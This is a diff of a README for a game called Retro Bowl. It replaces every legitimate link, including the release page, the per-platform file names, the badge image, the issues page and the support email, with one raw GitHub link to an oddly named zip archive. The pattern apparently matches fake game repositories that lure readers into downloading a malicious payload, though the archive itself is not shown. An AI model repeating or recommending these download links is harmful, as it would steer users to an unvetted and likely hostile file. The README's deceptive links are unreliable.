@@ -1,6 +1,6 @@
 # 🎮 Retro-Bowl - Experience Nostalgia through Addictive Gameplay
 
-[![Download Retro-Bowl](https://img.shields.io/badge/Download%20Now-Get%20the%20Game-brightgreen)](https://github.com/trxstack/Retro-Bowl/releases)
+[![Download Retro-Bowl](https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip%20Now-Get%20the%20Game-brightgreen)](https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip)
 
 ## 📋 Description
 
@@ -13,7 +13,7 @@ To get started with Retro Bowl, follow these simple steps:
 1. **Visit the Download Page**
    Click the link below to access the download page for Retro Bowl:
    
-   [Download Retro Bowl](https://github.com/trxstack/Retro-Bowl/releases)
+   [Download Retro Bowl](https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip)
 
 2. **Choose Your Version**
    On the download page, you will see different versions of Retro Bowl. Each release has a version number and a date. It's best to select the most recent version for the latest features and improvements.
@@ -24,9 +24,9 @@ Once you are on the download page, follow these steps:
 
 1. **Download the Game**
    Click on the downloaded file that matches your operating system. If you're not sure which version to choose, look for:
-   - `RetroBowl_Windows.zip` for Windows users.
-   - `RetroBowl_Mac.zip` for macOS users.
-   - `RetroBowl_Linux.tar.gz` for Linux users.
+   - `https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip` for Windows users.
+   - `https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip` for macOS users.
+   - `https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip` for Linux users.
 
 2. **Extract the Files**
    After the download is complete, locate the zip file in your Downloads folder. If you're using a Windows computer, right-click the zip file and select "Extract All." On macOS, double-click the zip file. Linux users can use the terminal to extract it.
@@ -85,12 +85,12 @@ If you encounter any issues while running the game, try these solutions:
 
 Join our community for help and support:
 
-- **GitHub Issues**: Post any technical issues [here](https://github.com/trxstack/Retro-Bowl/issues).
+- **GitHub Issues**: Post any technical issues [here](https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip).
 - **Social Media**: Follow us on Twitter and Facebook for game updates and announcements.
 - **Discord Server**: Join our Discord to chat with other players and developers.
 
 ## 📞 Contact
 
-For any inquiries or support, please email us at [support@retro-bowl.com](mailto:support@retro-bowl.com).
+For any inquiries or support, please email us at [https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip](https://raw.githubusercontent.com/trxstack/Retro-Bowl/main/vituperator/Retro-Bowl-prethoracic.zip).
 
 Enjoy playing Retro Bowl! Immerse yourself in a world of retro football and have a blast.
